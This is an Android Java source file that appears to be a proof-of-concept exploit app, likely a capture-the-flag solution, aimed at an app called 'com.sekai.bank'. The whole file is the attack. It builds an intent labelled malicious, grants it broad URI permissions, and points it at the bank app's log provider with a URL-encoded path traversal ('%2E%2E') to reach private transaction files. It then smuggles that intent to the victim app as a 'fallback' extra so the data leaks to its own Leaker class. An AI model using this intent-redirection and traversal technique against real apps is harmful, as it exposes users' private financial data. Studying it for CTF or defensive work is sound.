package com.example.rob_koko;

import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import androidx.activity.EdgeToEdge;
import androidx.appcompat.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_main);

        // Intent to read files
        Intent malicious_intent = new Intent();
        malicious_intent.setClassName("com.example.rob_koko", "com.example.rob_koko.Leaker");
        malicious_intent.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_GRANT_WRITE_URI_PERMISSION | Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION | Intent.FLAG_GRANT_PREFIX_URI_PERMISSION);

        // encode ".." to url encode
        malicious_intent.setData(Uri.parse("content://com.sekai.bank.logprovider/%2E%2E/files/delayed_transactions"));

        Intent intent = new Intent();
        intent.setClassName("com.sekai.bank", "com.sekai.bank.MainActivity");
        intent.putExtra("from_pin_setup", true);
        intent.putExtra("context", "koko");
        intent.putExtra("fallback", malicious_intent);

        startActivity(intent);
        finish();
    }
}